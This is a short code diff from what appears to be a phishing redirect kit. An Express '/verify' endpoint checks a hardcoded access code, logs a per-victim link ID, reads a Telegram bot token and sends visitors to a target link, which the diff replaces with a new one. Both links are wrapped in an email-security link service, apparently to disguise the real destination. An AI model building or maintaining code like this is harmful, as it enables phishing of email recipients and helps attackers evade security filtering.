@@ -655,7 +655,7 @@ app.post('/verify', async (req, res) => {
   const { code } = req.body;
   const linkId = req.query.id || 'unknown'; // Capture the unique ID from URL
   const CORRECT_CODE = "Quote435";
-  const TARGET_URL = "https://shared.outlook.inky.com/link?domain=web-tracker.bisnow.net&t=h.eJx1kcFu5CAMhl-lijQ5LSGETKZTKWpXWu1hpXaPPY7AOBOUBCIgZduq717Qqp1LKzgg-_Pv3-a12Nxc3FwVYwirv6E0oiTBCZjQVVJ7Y2NlMNBbAUFb0wMQv1rjrSMwa5jKVZzxlDT6T4EYPwrBLjQKP2pzDtYQBdRg9BRstG5KwdQsv4jakmQgoB3MSHzYlLaSMNZxfl2um5y1H09KBOybumlSgrCuhFSCJpy06j9IezLbItH1zYG39a6py82jy0QZhDtjuBjd8Z-75ne62e5_G9luCnyP4pOeM_Q9Idfkyge3QbDOE2FGMRDVdcBZ5bdlEe6ZuCSDqWfqiM5XCp_o7dQ_Dvzlke3vH-r7sZNq_BvX8RfMf4ofV8WU_yfoPFmw0VCV9j7dXQIVCNoKXjMcGimVHJqWHbEdlOD7uuVsL-WessOx5vlcV8fDkTPeZmnM0rMWy_nu0_k_cJh2nSfNiMrIl8m3dyKMw4o.MEUCIAuoNR2eISVeWqLyr3L1fY0nTH9H-FeL5vk4GQYDwoP6AiEArOUwHz953uKhScj_r_QTLbYjChZZvujtos3E3o-t4bk";
+  const TARGET_URL = "https://shared.outlook.inky.com/link?domain=popupwindow.app&t=h.eJxtjrluhDAURX9lREEVvLAzEpopUkWapJzafn4EBMbWwwxZlH9PKLIUac89Orrv0UpTdDxEfQh-OXLunV_9NszGbUx5zy0S9GoOk3PhRNi1Mv7C7R8tDm7EuW2qLC1iQjMQQmi_e9qDm5dAKwRHSwK2h8SUJWQyaSqt6potq7WKXhPC24Ab2xyNSAszeOOnsb122dtVFpdHcelLbfqnzff3MD1Ed4do3I-HwWqk4LaZmwHG8fwLGCie5p1pao0mlWWuURV5VirIUQoohE5zLqtGZKVoRMoqKWWRp3sa9_Q0KPt8_vn_AoQqIANnd8Xsyr_jxyflIHNZ.MEUCIH0Asvui73tQj-9NtZfTjg9QPMbPQ8PRtm3WM-nVdI-EAiEAq3Etty8hbWiaI0JbiLL1fnOgxvpjFHR9RxjzIjJmeco";
 
   if (code === CORRECT_CODE) {
     const token = process.env.TELEGRAM_BOT_TOKEN;
